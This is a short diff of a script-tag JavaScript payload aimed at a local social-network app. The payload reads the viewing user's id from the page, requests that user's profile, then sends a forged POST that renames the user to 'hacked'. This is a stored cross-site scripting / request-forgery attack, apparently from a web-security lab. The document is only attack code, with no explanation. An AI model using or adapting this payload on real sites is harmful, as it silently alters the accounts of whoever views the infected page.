@@ -1,6 +1,7 @@
 <script>
 
 var viewer_id = document.getElementById("viewer").innerHTML;
+console.log(viewer_id)
 var viewer_bio = "";
 
 var xhttp = new XMLHttpRequest();
@@ -13,16 +14,18 @@ xhttp.onreadystatechange = function() {
         console.log(bio);
     }
 };
-var get_url = "http://127.0.0.1:8000/social/profile/" + "?pk=" + viewer_id
+var get_url = "http://127.0.0.1:8000/social/profile/" + viewer_id
 xhttp.open("GET", get_url, true);
 xhttp.send();
 
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://127.0.0.1:8000/social/profile/", true);
+var post_url = "http://127.0.0.1:8000/social/profile/" + viewer_id + "/"
+xhr.open("POST", post_url, true);
 
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 var data = "pk=" + viewer_id;
+data += "&name=hacked"
 
 xhr.send(data);
 
